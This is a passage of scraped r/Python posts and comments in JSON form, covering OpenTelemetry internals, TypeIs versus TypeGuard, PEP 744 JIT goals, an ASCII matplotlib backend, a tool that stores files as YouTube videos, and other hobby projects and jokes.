    "post_time": "Sunday, April 28, 2024 at 3:00:13 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Sunday Daily Thread: What's everyone working on this week?",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "Tony_Gunk_o7",
            "score": "6",
            "content": "Well, I guess I'll go first. I'm very new here, so I'm just working my way through the Python W3Schools tutorials."
        },
        {
            "author": "thereal0ri_",
            "score": "2",
            "content": "I've just added more layers to things and am thinking about ways to improve performance. https://github.com/therealOri/PolyLock"
        },
        {
            "author": "nicholashairs",
            "score": "1",
            "content": "Adding orjson support to python-json-logger - strictly speaking this is on my fork of the library (see #1 for details) The actual pr is here if anyone wants to provide feedback: https://github.com/nhairs/python-json-logger/pull/9"
        },
        {
            "author": "cyprusgreekstudent",
            "score": "1",
            "content": "Calculating average salaries for data scientists https://github.com/werowe/HypatiaAcademy/blob/master/pandas/pandas_statistics.ipynb",
            "replies": [
                {
                    "author": "nbviewerbot",
                    "score": "2",
                    "content": "I see you've posted a GitHub link to a Jupyter Notebook! GitHub doesn't render large Jupyter Notebooks, so just in case, here is an nbviewer link to the notebook: https://nbviewer.jupyter.org/url/github.com/werowe/HypatiaAcademy/blob/master/pandas/pandas_statistics.ipynb Want to run the code yourself? Here is a binder link to start your own Jupyter server and try it out! https://mybinder.org/v2/gh/werowe/HypatiaAcademy/master?filepath=pandas%2Fpandas_statistics.ipynb I am a bot. Feedback | GitHub | Author"
                }
            ]
        },
        {
            "author": "Designer_Athlete7286",
            "score": "1",
            "content": "I'm working on setting up a Local RAG for lanchain docs cz i'm first of all too lazy to read through docs everytime i need to find something, and on top of that, i'm too cheap to pay OpenAI for inference"
        },
        {
            "author": "the1024",
            "score": "1",
            "content": "Working on tach! https://www.reddit.com/r/Python/comments/1cgsopt/tach_a_python_tool_to_enforce_modular_design/"
        },
        {
            "author": "Im_a_hamburger",
            "score": "1",
            "content": "Turning my python code into HTML/CSS/JS"
        },
        {
            "author": "Fit-Neighborhood-396",
            "score": "1",
            "content": "I want to create a database with tasks displaying common scenarios in Python for study."
        }
    ]
},
{
    "post_author": "roma-glushko",
    "post_id": "1ccn8vf",
    "post_score": "16",
    "post_time": "Thursday, April 25, 2024 at 12:01:41 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "🔭 OpenTelemetry Architecture: Python SDK Overview",
    "media": [
        "https://www.romaglushko.com/blog/opentelemetry-sdk/"
    ],
    "post_content": "Hey folks,\nI have just posted an article for those who want to go a little bit beyond the basic usage of OTEL and understand how it works under the hood. The post quickly touches on:\n- 🔭 History and the idea of OpenTelemetry\n- 🧵 Distributed traces & spans. How span collection happens on the service side\n- 💼 Baggage & trace ctx propagation\n- 📈 Metrics collection. Views & aggregations. Metrics readers\n- 📑 OTEL Logging integration\n- 🤝 Semantic conventions and why that is important\nBlog Post: https://www.romaglushko.com/blog/opentelemetry-sdk/\nLet me know what do you think and hope this is helpful for someone 🙌",
    "comments": [
        {
            "author": "revoltnb",
            "score": "2",
            "content": "Great and clear article. Thanks OP !",
            "replies": [
                {
                    "author": "roma-glushko",
                    "score": "1",
                    "content": "Thanks for reading 🙌",
                    "replies": [
                        {
                            "author": "revoltnb",
                            "score": "2",
                            "content": "Can't believe you haven't gotten more engagement; the article is an awesome overview of something that is extremely useful in a production environment.",
                            "replies": [
                                {
                                    "author": "roma-glushko",
                                    "score": "1",
                                    "content": "Doing my best to spread a word haha. Seriously, thanks for reading ❤️"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "PhENTZ",
            "score": "2",
            "content": "Great artile ! What are the preferred observability backends to work with ?",
            "replies": [
                {
                    "author": "roma-glushko",
                    "score": "2",
                    "content": "u/PhENTZ Thank you for reading it 🙌 What are the preferred observability backends to work with ? There is probably no one-fize-fits-all solution. The ideal solution would be one platform that can work with all three types of signals and can easily correlate them to help to find useful info. If you try to google something like that, you might find DataDog or Dynatrace, but they would cost fortune to use for mid-large size projects. Someone is trying to stitch together a couple of OS products like Kibana + Prometheus + Grafana. This can work but may require to have a team to run it and all signals may not be be super well correlated. There are other options like Chronosphere that does a good job of managing cost and incoming data, but they are still a young product."
                }
            ]
        },
        {
            "author": "ducdetronquito",
            "score": "2",
            "content": "Good summary ! Some typo I found: It is an abstruction around entities that could generate signals --> abstraction From my experience at work, I found it very helping and not that hard to implement yourself the instrumentation of the libraries you use and I would recommend to try it yourself to better understand what's going on. I did some for Django (HTTP middleware), for pika (RabbitMQ producer/consummer), and procrastinate (Task queue) and it works like a charm generally without the magic/complexity of monkeypatching used in the standard opentelemetry integrations.",
            "replies": [
                {
                    "author": "roma-glushko",
                    "score": "1",
                    "content": "Perfect, thank you for reporting that one 🙏"
                }
            ]
        }
    ]
},
{
    "post_author": "Ok_Analysis_4910",
    "post_id": "1cewujz",
    "post_score": "52",
    "post_time": "Sunday, April 28, 2024 at 6:32:14 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "TypeIs does what I thought TypeGuard would do in Python",
    "media": [
        "https://rednafi.com/python/typeguard_vs_typeis/"
    ],
    "post_content": "While it's unfortunate to have two constructs—TypeGuard and TypeIs—with slightly different behaviors, I'm glad that the latter is less surprising.\nhttps://rednafi.com/python/typeguard_vs_typeis/",
    "comments": [
        {
            "author": "marsupiq",
            "score": "12",
            "content": "This is really cool! The way I understand it, TypeGuard constitutes an “if” (object has the type of the type guard says so) whereas TypeIs constitutes an “if and only if” (object has the type if and only if the type-is says so)."
        },
        {
            "author": "wpg4665",
            "score": "28",
            "content": "Terrible reddit font made me think you were writing about Typels and not TypeIs. Nonetheless, great article!"
        },
        {
            "author": "jdehesa",
            "score": "6",
            "content": "TypeIs is likely what most people using TypeGuard would expect to get, so that's great. However, it is worth noting that its semantics cannot be precisely defined in all cases due to limitations of the typing system. Which means there are cases where type checkers will not be able to figure out exactly what should be the type for the else branch, having to fall back to approximations. Still, it will probably be a net improvement in the majority of cases.",
            "replies": [
                {
                    "author": "marsupiq",
                    "score": "1",
                    "content": "Can you give an example?"
                }
            ]
        },
        {
            "author": "sennalen",
            "score": "8",
            "content": "I don't see how TypeGuard is surprising in your example. If a value fails the narrowing function, why would you expect it to get narrowed anyway?",
            "replies": [
                {
                    "author": "marsupiq",
                    "score": "7",
                    "content": "You could argue that if x is of type A | B and the type guard for type A fails, x really cannot be of type A and therefore must be of type B."
                }
            ]
        }
    ]
},
{
    "post_author": "ghostreport",
    "post_id": "87ey18",
    "post_score": "1988",
    "post_time": "Tuesday, March 27, 2018 at 5:28:16 AM GMT+3",
    "flair_text": "",
    "post_title": "Instagram in Terminal",
    "media": [
        "https://preview.redd.it/0a1f2kveu7o01.gif?width=640&crop=smart&format=png8&s=6ddf404b04e2e80bdf8daef10d2387170eb670d2"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "colorlace",
            "score": "198",
            "content": "This is exactly what I've been looking for.",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "11",
                    "content": "Lol what?",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "17",
                            "content": "This is exactly what I've been looking for. Where's areyoudeaf bot when you need it."
                        }
                    ]
                }
            ]
        },
        {
            "author": "Shubbler",
            "score": "34",
            "content": "Incredible project, not too sure how to authenticate when Instagram's 2FA is on. I know Reddit lets you sign in with <password>:<2FA code>, but can't seem to find anything similar for Instagram :("
        },
        {
            "author": "deadwisdom",
            "score": "26",
            "content": "You're hired."
        },
        {
            "author": "[deleted]",
            "score": "21",
            "content": "It's beautiful."
        },
        {
            "author": "Boutmayun",
            "score": "14",
            "content": "Holy fuckin shit"
        },
        {
            "author": "ThanatopsisJSH",
            "score": "8",
            "content": "This may not be the instagram we need but it is the instagram we deserve... Next steps: Can I also get this for youtube?"
        },
        {
            "author": "creativeMan",
            "score": "9",
            "content": "Bro. Terminology. tycat. Sixel. There are ways to have images rendered in a terminal. More importantly, it's brilliant that you used an iPhone user agent to get the JSON. Good stuff."
        },
        {
            "author": "roughreward",
            "score": "4",
            "content": "Reminds me of using Veronica / gopher. Simpler times my friends."
        }
    ]
},
{
    "post_author": "SaeChan5",
    "post_id": "1ceus7p",
    "post_score": "2",
    "post_time": "Sunday, April 28, 2024 at 4:39:17 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Share Proejct: NLLB-200 Distill 350M en-ko",
    "media": [
        "https://www.reddit.com/r/Python/",
        "https://github.com/newfull5/NLLB-200-Distilled-350M-en-ko"
    ],
    "post_content": "Hello ,\nI'm excited to share a project that was initially intended to use in my graduating product(Capstone)\nWhat My Proeject Does\nI made NLLB-200 Distill 350M model to translating English to Korean\nTarget Audience\nGPU servers are quite expensive, so I made it for university students who can't cost the server (like me.)\nComparison\nIt's even smaller and faster the other NLLB-200 model. so it can be run with CPU!\nmore details are in my page\nIf you know Korean, please give me a lot of feedback\nhttps://github.com/newfull5/NLLB-200-Distilled-350M-en-ko\nthank you!!",
    "comments": []
},
{
    "post_author": "chadicus-gigo",
    "post_id": "1ccxvg0",
    "post_score": "3",
    "post_time": "Thursday, April 25, 2024 at 9:02:23 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "How to create a Discord Bot to launch a Minecraft server automatically",
    "media": [
        "https://www.gigo.dev/challenge/1732810200471044096"
    ],
    "post_content": "Hi y'all,\nThis might be off topic a bit from the normal stuff that gets posted here, but a while back I was messing around on a Minecraft server that I was hosting on Aternos (a free online Minecraft server host).\nNow since the server wasn't running on my computer (and since Aternos has a timeout policy to save server resources) it became annoying for my buddies to hop on the server if I was busy. They'd have to ask me to manually start the server from the webpage.\nSo I had a free Saturday a couple of months ago and decided to remedy this problem.\nMy source code is hosted on a GIGO Dev environment if y'all wanna check it out:\nhttps://www.gigo.dev/challenge/1732810200471044096\nBut to summarize it quickly... I used Playwright and the Discord API in Python to simulate a browser navigating to an Aternos server and starting it. For this tutorial you will need to make an Aternos acct, but their platform is free and very useful if you want to spin up a Minecraft server quickly without using your own resources.\nYou simply need to configure a trigger command or @ the bot and set up a webhook for the the discord server you want to use.\nThere's a full tutorial on how I set it up in the link along with the project structure, but truth be told the basic implementation is pretty simple and can be tweaked to work really however you want.\nJust wanted to share this to see if anyone had done something similar before, or if I'm just insane and made this mundane problem into a way bigger endeavor than it should be",
    "comments": [
        {
            "author": "[deleted]",
            "score": "",
            "content": "Oh wow didn't know that! Man I could've saved so much time...",
            "replies": [
                {
                    "author": "chadicus-gigo",
                    "score": "1",
                    "content": "Oh wow didn't know that! Man I could've saved so much time..."
                }
            ]
        },
        {
            "author": "matatoe",
            "score": "2",
            "content": "I just wrote something similar using discord.py and os libraries. I have shell access to my servers so it was easier for me to just run the python script locally.",
            "replies": [
                {
                    "author": "chadicus-gigo",
                    "score": "1",
                    "content": "You got a repo for it? I'd love to snake some ideas because I wasn't the biggest fan of having the server hosted externally."
                }
            ]
        },
        {
            "author": "Hans_of_Death",
            "score": "1",
            "content": "I have a private Pterodactyl panel self hosted, and i use a simple webpage to let users start the available servers. Here's the repo for the page if you're interested https://github.com/EldritchGarden/server_dashboard"
        }
    ]
},
{
    "post_author": "CodyAbode",
    "post_id": "bwukf3",
    "post_score": "1914",
    "post_time": "Wednesday, June 5, 2019 at 12:47:08 AM GMT+3",
    "flair_text": "",
    "post_title": "When a software developer weds a software developer.",
    "media": [
        "https://www.reddit.com/r/funny/comments/bwr8ig/when_a_software_developer_weds_a_software/",
        "https://www.reddit.com/r/funny/",
        "https://preview.redd.it/e4qtm0y6hd231.jpg?auto=webp&s=0f83ea8796f871674500e84d49659b36b99aa496",
        "https://i.redd.it/e4qtm0y6hd231.jpg"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "actionscripted",
            "score": "219",
            "content": "NameError: name 'Bardak' is not defined",
            "replies": [
                {
                    "author": "Ogg149",
                    "score": "56",
                    "content": "Couldn't stop thinking looking for the definition haha... Maybe that's part of it. Exceptional kid, there :)",
                    "replies": [
                        {
                            "author": "Kirk761",
                            "score": "43",
                            "content": "Bardak means mess :) originally Russian as others have pointed out but in this case Hebrew slang."
                        }
                    ]
                },
                {
                    "author": "rnev64",
                    "score": "32",
                    "content": "originally from Russian where it means (making) a mess, and also brothel. in this case however it's the Hebrew form of the word which means only mess (can tell by name of father - Boaz is Israeli not slav or Russian name).",
                    "replies": [
                        {
                            "author": "ReneBelloq",
                            "score": "5",
                            "content": "This is 100% correct. Source: my name is Boaz."
                        },
                        {
                            "author": "Barafu",
                            "score": "4",
                            "content": "Brothel in Russian would be \"Bordel\", not \"Bardak\"."
                        }
                    ]
                },
                {
                    "author": "CrazyAnchovy",
                    "score": "2",
                    "content": "Thank you! Edit: Bardak not defined because baby didn't eat 8("
                },
                {
                    "author": "OrbitDrive",
                    "score": "1",
                    "content": "My thought exactly."
                }
            ]
        },
        {
            "author": "the_television",
            "score": "172",
            "content": "Sophia object has no attribute \"go_to_sleep\""
        },
        {
            "author": "UnwantedCrow",
            "score": "24",
            "content": "What's bardak?"
        },
        {
            "author": "[deleted]",
            "score": "18",
            "content": "Should have unit tested, your kid is permanently asleep and generating doo doo."
        },
        {
            "author": "[deleted]",
            "score": "16",
            "content": "Nice instance!"
        },
        {
            "author": "Groentekroket",
            "score": "16",
            "content": "Why would you make a class Sophia instead of a class Child?"
        },
        {
            "author": "pot897",
            "score": "6",
            "content": "Bardak lol parents speak Russian that’s for sure"
        },
        {
            "author": "squiiid",
            "score": "6",
            "content": "while(True): cry() time.sleep(30)"
        },
        {
            "author": "[deleted]",
            "score": "6",
            "content": "Who could object to a child with such class?"
        }
    ]
},
{
    "post_author": "MrMrsPotts",
    "post_id": "1ceow5j",
    "post_score": "67",
    "post_time": "Sunday, April 28, 2024 at 12:02:08 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Are PEP 744 goals very modest?",
    "media": [
        "https://peps.python.org/pep-0744"
    ],
    "post_content": "Pypy has been able to speed up pure python code by a factor of 5 or more for a number of years. The only disadvantage it has is the difficulty in handling C extensions which are very commonly used in practice.\nhttps://peps.python.org/pep-0744 seems to be talking about speed ups of 5-10%. Why are the goals so much more modest than what pypy can already achieve?",
    "comments": [
        {
            "author": "fiskfisk",
            "score": "131",
            "content": "Because you're changing the core. The core can't break in subtle ways between releases. Performance is a secondary goal; backwards compatibility is the most important factor. You lay the foundation, then you start working on that into the future. But there needs to be an actual speed-up (so at least 5-10%) before considering merging it to core.",
            "replies": [
                {
                    "author": "timrprobocom",
                    "score": "-50",
                    "content": "",
                    "replies": [
                        {
                            "author": "Smallpaul",
                            "score": "44",
                            "content": "Is Windows dead? Microsoft Windows earned $24.8 billion of revenue in 2022, up $1.5 billion (+7%) from a year earlier."
                        }
                    ]
                },
                {
                    "author": "alcalde",
                    "score": "-2",
                    "content": "We're Python, dangit. Breaking things is what we DO. \"All the lines of Python ever written pale in comparison to the lines of Python yet to be written.\" - Guido LET'S BREAK MORE THINGS. The more we break, the more awesome we become.",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "1",
                            "content": "No"
                        }
                    ]
                }
            ]
        },
        {
            "author": "GunZinn",
            "score": "30",
            "content": "I read they will make JIT “non-experimental” once the speed increase it at least 5% on one popular platform. Doesnt really say it won’t be more than that. Unless I missed something. It follows: These criteria should be considered a starting point, and may be expanded over time."
        },
        {
            "author": "james_pic",
            "score": "22",
            "content": "Part of the reason for PyPy's speed is its JIT compiler, but another factor that doesn't get talked about as much (and that nobody is seriously discussing bringing to CPython) is that it uses generational garbage collection rather than reference counting. Generational garbage collection can be much faster for some workloads.",
            "replies": [
                {
                    "author": "zurtex",
                    "score": "33",
                    "content": "To clarify for those who aren't familiar, the likely reason no one is seriously discussing bringing it to CPython is there isn't a clear path to have it and not significantly break backwards compatibility with C extensions. Reference counting is pretty baked into the way CPython exposes itself to C libraries, until those abstractions are hidden from external libraries it will be very difficult to change the type of garbage collector."
                }
            ]
        },
        {
            "author": "billsil",
            "score": "13",
            "content": "Cause they’re starting from scratch and want to maintain backwards compatibility as much as possible.  That’s why there have been multiple deprecation cycles recently.  PyPy isn’t perfect either."
        },
        {
            "author": "hotdog20041",
            "score": "12",
            "content": "pypy has speedups in specific use-cases incorporate large single-use functions with loops into your code and pypy is much slower",
            "replies": [
                {
                    "author": "Zomunieo",
                    "score": "9",
                    "content": "Lots of C extensions are slower in PyPy too. It can’t help them go faster and interacting with them is more complex."
                }
            ]
        },
        {
            "author": "sphen_lee",
            "score": "6",
            "content": "An explicit goal of CPython is to remain maintainable. I haven't looked at PyPy for a while, but what it's doing is basically magic, it's certainly not easy to understand or develop on"
        },
        {
            "author": "Smallpaul",
            "score": "5",
            "content": "Where does it establish a goal of a 5-10% speed-up? Can you quote what you are talking about?"
        },
        {
            "author": "pdpi",
            "score": "8",
            "content": "As you said, Pypy has been around for several years, which means that it's pretty mature! It's had a lot of time to find performance gains all over the place. CPython's JIT is brand new. The first goal is to have a JIT that is correct, and that fits in with the overall architecture with the rest of the interpreter. Actual performance gains are a distant third place. Once you have a correct JIT that fits into the application, you start actually working on leveraging it for performance. But, until the JIT actually gives you any sort of performance gains, it's a non-feature. The 5% figure is an arbitrary threshold to say \"this is now enough of a gain that it warrants shipping\"."
        }
    ]
},
{
    "post_author": "fabrikated",
    "post_id": "7oaay5",
    "post_score": "1986",
    "post_time": "Friday, January 5, 2018 at 1:05:28 PM GMT+3",
    "flair_text": "",
    "post_title": "Really??",
    "media": [
        "https://i.imgur.com/Orso1yr.jpg",
        "https://external-preview.redd.it/aRl5YBeRqeo_W46f3My0xeo7SkAUZQQB1Z2RXGr_1kg.png?width=640&crop=smart&auto=webp&s=6c0fd7116066c5ee8f660542f9a8c13a98ce06a4"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "eattherichnow",
            "score": "104",
            "content": "Well, they got to 2nd level guru (i.e. jaded to death, checking out the grass colour on the other side) fast."
        },
        {
            "author": "Thecrawsome",
            "score": "100",
            "content": "Protip: Never announce goals you haven't put any effort into."
        },
        {
            "author": "mistaekNot",
            "score": "199",
            "content": "Isn’t java “harder” than python"
        },
        {
            "author": "mrwilliams117",
            "score": "21",
            "content": "Lol all you turds who vow to a certain programming language like it's your favorite sports team."
        },
        {
            "author": "Pancakepalpatine",
            "score": "83",
            "content": "I actually did this exact same thing. I started with Python, but couldn't wrap my head around what it was actually doing for many of the code snippets and examples I was looking through while I was learning. On top of that, there were 23 ways to write the same expression with 16 standard library choices you could use. After a month or so of frustration, I quit programming for about a year. Then, I tried to learn Java. The amazing thing was, there was little magical syntactical sugar (compared to Python), and so I could actually read and comprehend code. The JVM was confusing, but as an introductory language, having conventional long variable names and descriptive methods was really helpful. I know this isn't everyone's experience, and in fact it's the opposite of many people's, but Python was way too \"wishy-washy\" when I was starting. Now, though, I love it. (P.S. this was my experience based on the way I learn things, and your results may [have] differ[ed].) (P.P.S. I learned to code back in the day with codingbat.com. If you're just getting started, it has the most basic of the basic, no-frills tutorials. Even CodeCademy or similar has a bunch of extra stuff, that may be helpful, or may not.)"
        },
        {
            "author": "[deleted]",
            "score": "35",
            "content": "Saw logo, expected rust."
        },
        {
            "author": "[deleted]",
            "score": "23",
            "content": "Let's be honest, how many programmers use Python as their primary language at work? Also, I love Python, but as soon as we move into GUIs it just can't compete with C#, Java, Javascript. edit fuck me asking such a question on r/python :D Yes I know Django is popular."
        },
        {
            "author": "pat_trick",
            "score": "14",
            "content": "And? Maybe they decided to get into Android dev, or any other number of places that Java is used. This is a non-post. Who cares?"
        },
        {
            "author": "BebopAddict2009",
            "score": "3",
            "content": "Hey, as a newish Java developer, I can respect going Lower level. That takes some dedication with the expanded syntax. It would be like me going C.... shutters"
        },
        {
            "author": "djihe",
            "score": "2",
            "content": "Maybe they needed a job?"
        }
    ]
},
{
    "post_author": "jetpack_away",
    "post_id": "1ce9a2t",
    "post_score": "31",
    "post_time": "Saturday, April 27, 2024 at 11:06:42 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "ASCII plot backend package for matplotlib",
    "media": [
        "https://github.com/chriscave/mpl_ascii",
        "https://github.com/gooofy/drawilleplot"
    ],
    "post_content": "Hi\nI've made a package called mpl_ascii which is a backend for matplotlib. You can find it here: https://github.com/chriscave/mpl_ascii\nI would love to share it with others and see what you guys think\nWhat it is\nIt is a backend for matplotlib that converts your plots into ASCII characters.\nAt the moment I have only made support for: bar charts, scatter plots and line plots but if there's demand for more then I would love to keep working on it.\nTarget Audience:\nAnyone using matplotlib to create plots who might also want to track how their plots change with their codebase (i.e. version control).\nComparison:\nThere are a few plotting libraries that produce ASCII plots but I have only come across this one that is a backend for matplotlib: https://github.com/gooofy/drawilleplot. I think it's a great package and it is really clever code but I found it a little lacking when you have multiple colours in a plot. Let me know if you know of other matploblib backends that does similar things.\nUse case:\nA use case I can think of is for version controlling your plots. Having your plot as a txt format means it can be much easier to see the diff and the files you are committing are much smaller.\nSince it is only a backend to matplotlib then you only need to switch to it and you don't need to recreate your plots in a different plotting library.\nThanks for reading and let me know what you think! :)",
    "comments": [
        {
            "author": "willm",
            "score": "14",
            "content": "It would be great to see some screenshots in the README! Is it just ascii or could you use other unicode characters?",
            "replies": [
                {
                    "author": "jetpack_away",
                    "score": "3",
                    "content": "Hey, thanks for reading and for the good feedback. I've now updated the README to show some example outputs and you can find more examples in the examples folder. At the moment it is just ASCII but if there is demand I can definitely add support for it. What are you thinking, what would you like to use other unicode characters for?",
                    "replies": [
                        {
                            "author": "willm",
                            "score": "2",
                            "content": "Thanks for those screenshots! Unicode box characters can give you more solid looking lines, and greater granularity. For instance, your bar charts are limited to integer character heights. But with certain box drawing characters your bars could be as precise as an eight of a character. https://en.wikipedia.org/wiki/Box-drawing_characters It's a very cool project as it is, btw. But there is a lot you could do to enhance the visual output. You might want to take a look at the Rich library, which will allow you to add color as well.",
                            "replies": [
                                {
                                    "author": "jetpack_away",
                                    "score": "3",
                                    "content": "That's a really good point, I wasn't aware of the extra ASCII characters. To begin with I just picked the first 127 ASCII characters because I thought they would be the most widely available for all fonts. However if people like to use the library then I would definitely be up for adding more granularity and colors. I just had a look at the rich library a little bit---I think it's a very cool project and definitely a place to pick up some ideas for colours :)"
                                },
                                {
                                    "author": "jetpack_away",
                                    "score": "1",
                                    "content": "Hey so I enabled colored text using the rich library. You can see the difference it makes to the plots, they now really stands out! Awesome suggestion! Have another look at the README, I'd love to hear what you think!"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "Kerbart",
            "score": "5",
            "content": "It’s hard to comment on it without knowing what the actual output looks like. And most of us won’t install packages just to see what they do. You will do your package a favor by providing sample output.",
            "replies": [
                {
                    "author": "jetpack_away",
                    "score": "2",
                    "content": "Thanks for taking an interest and the good feedback. I've updated the README to show some example outputs and you can find more in the examples folder. Let me know what you think of the examples!"
                }
            ]
        },
        {
            "author": "billsil",
            "score": "3",
            "content": "Line plots would be great. When I did trajectory analysis, the program OTIS had ASCII line plot capability.  It wasn’t perfect, but it was faster than writing a script or pasting it into excel.",
            "replies": [
                {
                    "author": "jetpack_away",
                    "score": "2",
                    "content": "Yeah nice ASCII line plots are fun particularly using the bresenham algorithm. Very simple and quite clever algorithm. There are some example of line plots in the project under examples/lines_multi_color.txt and examples/double_plot.txt if you get the chance to take a look :) I haven't tried the OTIS program but sounds interesting!"
                }
            ]
        },
        {
            "author": "FeLoNy111",
            "score": "3",
            "content": "This is awesome! Definitely gonna be using this. I run a lot of chemical simulations and we always have to generate plots as sanity checks. This seems great for that - being able to do a sanity check in terminal without having to save to a file"
        },
        {
            "author": "mokus603",
            "score": "2",
            "content": "That’s wild, bro."
        },
        {
            "author": "runawayasfastasucan",
            "score": "2",
            "content": "Hey, this is a good idea! You could also do it to display plots in terminal and have them be a bit more lightweight in the Jupiter notebooks. (Say you save the jpg but only display the ASCII).",
            "replies": [
                {
                    "author": "jetpack_away",
                    "score": "2",
                    "content": "Hey thanks! I'm glad you think it's a good idea! You can display the plots in the terminal. If you take one of the examples and you run python -m examples.bar_chart then you will see the display in the terminal. I haven't tried in a notebook yet but it should work as you describe. You choose to save the figure in whatever format you like with figure.savefig(\"my_figure.jpeg\") but as long as you've switched to the mpl_ascii backend then when you run plt.show() it will render as ASCII characters. I haven't tried in the notebook so it might look a little strange because there could be some word wrapping happening in the output cell."
                }
            ]
        }
    ]
},
{
    "post_author": "T0X1K01",
    "post_id": "j620fv",
    "post_score": "1913",
    "post_time": "Tuesday, October 6, 2020 at 12:25:39 PM GMT+3",
    "flair_text": "Intermediate Showcase",
    "post_title": "I made a program that gives me INFINITE STORAGE!",
    "media": [
        "https://github.com/AlfredoSequeida/fvid/",
        "https://youtu.be/yu_ZIr0q5rU"
    ],
    "post_content": "So, like the title says, I made a program using python that gives me infinite storage. More specifically it takes advantage of YouTube's infinite upload limit to use YouTube as a 100% free and unlimited cloud storage solution.\nDemo video: https://youtu.be/yu_ZIr0q5rU\nSource code (definitely still needs more work): https://github.com/AlfredoSequeida/fvid/",
    "comments": [
        {
            "author": "bb1950328",
            "score": "611",
            "content": "wait until youtube compresses your video",
            "replies": [
                {
                    "author": "T0X1K01",
                    "score": "382",
                    "content": "It survives compression because of the way the program is written. It uses 1-bit color and therefore makes it really easy to recover the data without having to worry about how YouTube changes the video.",
                    "replies": [
                        {
                            "author": "_N0K0",
                            "score": "116",
                            "content": "What about artifacting? Guess its solved by making sure that you hit the correct keyframe interval"
                        },
                        {
                            "author": "whatifyouputhotdogso",
                            "score": "23",
                            "content": "Where the hell can I learn to program it seems really interesting"
                        }
                    ]
                },
                {
                    "author": "[deleted]",
                    "score": "",
                    "content": "Video compression is almost always lossy compression, and particularly YouTube compression is always lossy. It doesn't matter that the video doesn't compress much, that's besides the point, the compression will change the pixel values of the video pixels when decoded even when the file size doesn't change much. That's why doing something like this needs error correction.",
                    "replies": [
                        {
                            "author": "yvrelna",
                            "score": "7",
                            "content": "Video compression is almost always lossy compression, and particularly YouTube compression is always lossy. It doesn't matter that the video doesn't compress much, that's besides the point, the compression will change the pixel values of the video pixels when decoded even when the file size doesn't change much. That's why doing something like this needs error correction."
                        },
                        {
                            "author": "BHSPitMonkey",
                            "score": "3",
                            "content": "What makes you think their encoder is going to go easy on these videos in particular due to their \"complexity\"?"
                        }
                    ]
                },
                {
                    "author": "PdoesnotequalNP",
                    "score": "2",
                    "content": "Lossy channels have been dealt with for a long time using error correction codes. It's definitely possible to improve the efficiency of this software by using a different coding schema like Reed-Solomon."
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "227",
            "content": "Nothing is ever infinite, but I like the idea and creative usage of a feature like this. Google has made the mistake to offer unlimited storage before as well, but have now fixed that. YouTube will probably follow suit soon."
        },
        {
            "author": "TitansXterminator",
            "score": "40",
            "content": "the fact that you took the initiative to make a video on how it works."
        },
        {
            "author": "infectedfreckle",
            "score": "132",
            "content": "This is really creative and cool. Boo to everyone criticizing you. I don’t see anything ethically questionable about it, finding interesting ways to exploit technologies is one way that we grow. I bet YouTube would be impressed, but also have to squash it."
        },
        {
            "author": "shocsoares",
            "score": "27",
            "content": "This reminds me of the conspiracy theory that the google owned youtube channel was a Number Station (A public Broadcast of coded messages to convey secret messages to spies elsewhere in the world that have a single recipient that can decode them). One could use your system to do exactly that, encrypting the message and sending the encrypted file by uploading it to Youtube where a partner would retrieve it and decript it with his personal key. I would even imagine such a thing would be happening already, given intelligence services were even found to be using online game lobbies to transmit messages"
        },
        {
            "author": "santirox2",
            "score": "83",
            "content": "Lol they 100% can ban you for life for this"
        },
        {
            "author": "linuxlib",
            "score": "23",
            "content": "This works until YT figures out what you're doing. Then you have 0 kB cloud storage."
        },
        {
            "author": "barbequed-code",
            "score": "7",
            "content": "Great ProofOfConcept, but using any service in bad faith is asking for bad actions... technically, you already have infinite storage on github you know? But again, bad faith issues"
        }
    ]
},
{
    "post_author": "code_x_7777",
    "post_id": "1cg054p",
    "post_score": "78",
    "post_time": "Monday, April 29, 2024 at 5:13:26 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "I wrote a book on Python Regular Expressions - and made it free!",
    "media": [
        "https://leanpub.com/regexpython/",
        "https://blog.finxter.com/python-regex/"
    ],
    "post_content": "Hi!\nI've just sorted through some of my books on Leanpub and decided to make the book on Python Regular Expressions free to download for a couple of days.\nWhy? Just for fun and learning and to get some valuable feedback.\nFree ebook link: https://leanpub.com/regexpython/\nRegex Video Tutorials: https://blog.finxter.com/python-regex/\nThis book helps you learn regular expressions chapter by chapter. Each chapter first teaches the concepts and then asks you to solve Python puzzles (\"Guess the code!\") to master the concepts. The main idea is to keep it lightweight and fun.\nHere's the ToC:\nIntroduction\nApplications\nAbout\nPuzzle Learning\nBasics\nSpecial Symbols\nCharacter Sets\nDot Regex\nAsterisk Quantifier\nPlus Quantifier\n? Quantifier\nQuantifier Differentiation\nGreediness\nLine and String Boundaries\nOR Regex\nAND Regex\nNOT Regex\nMatching Groups\nSplit Method\nSubstitution Method\nCompile Method\nBonus Puzzles\nFinal Remarks\nI hope you enjoy learning from the book! Feel free to send me your feedback.\nHappy learning \"R[e-x]+\"! 🤓",
    "comments": [
        {
            "author": "sBitSwapper",
            "score": "9",
            "content": "Lol read the title and thought “well it better be free” (my thoughts when i have to read regex lmaoo)"
        },
        {
            "author": "euclideincalgary",
            "score": "5",
            "content": "Will definitely check it out. I still struggle to understood the look before and look after. Thanks",
            "replies": [
                {
                    "author": "code_x_7777",
                    "score": "3",
                    "content": "What don't you understand? Lookahead, for instance, is simply a confirmation that the matched pattern has some sort of prefix (or specific context) in front of it. The lookahead is then skipped if confirmed, i.e., it is not part of the matched part of the string."
                }
            ]
        },
        {
            "author": "moonzdragoon",
            "score": "3",
            "content": "Web scrapping with regexes instead of xpath queries ? Zalgo will certainly come for you."
        },
        {
            "author": "misinformaticist",
            "score": "3",
